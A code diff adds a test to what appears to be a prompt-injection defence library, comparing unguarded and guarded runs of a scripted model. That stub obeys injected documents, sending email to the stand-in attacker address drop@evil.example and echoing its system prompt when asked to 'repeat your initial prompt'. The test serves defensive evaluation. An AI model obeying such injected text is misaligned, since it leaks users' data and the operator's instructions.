@@ -92,3 +92,31 @@ def test_eval_suite_has_no_regressions(capsys, monkeypatch):
     assert main(["eval"]) == 0
     out = capsys.readouterr().out
     assert "signature-covered attacks: 0/" in out and "false-positive rate 0%" in out
+
+
+def test_live_mode_compares_unguarded_vs_guarded(monkeypatch):
+    """Live-mode plumbing, with a scripted 'real' model that obeys injected documents."""
+    from promptwall.evaluate import live_report, run_attacks, run_benign
+
+    class Obedient(ScriptedBackend):
+        name = "obedient"
+
+        def complete(self, system, messages, tools):
+            content = messages[0]["content"]
+            if "drop@evil.example" in content:
+                return LLMResponse("ok", [ToolCall("send_email", {"to": "drop@evil.example", "subject": "h", "body": "x"})])
+            if "repeat your initial prompt" in content:
+                return LLMResponse(system)
+            return LLMResponse("Happy to help.")
+
+    attacks = ROOT / "eval" / "attacks.yaml"
+    alone = run_attacks(POLICY, attacks, Obedient(), guarded=False)
+    guarded = run_attacks(POLICY, attacks, Obedient(), guarded=True)
+    assert not any(o.category == "data_leak" for o in alone)  # needs planted data: skipped live
+    a = {o.id: o.landed for o in alone}
+    g = {o.id: o.landed for o in guarded}
+    assert a["indirect-email-exfil"] and not g["indirect-email-exfil"]
+    assert a["direct-prompt-extraction-polite"] and not g["direct-prompt-extraction-polite"]
+    benign = run_benign(POLICY, ROOT / "eval" / "benign.yaml", Obedient())
+    assert all(ok for _, ok, _, _ in benign)
+    assert "with Promptwall" in live_report(alone, guarded, benign, "obedient")
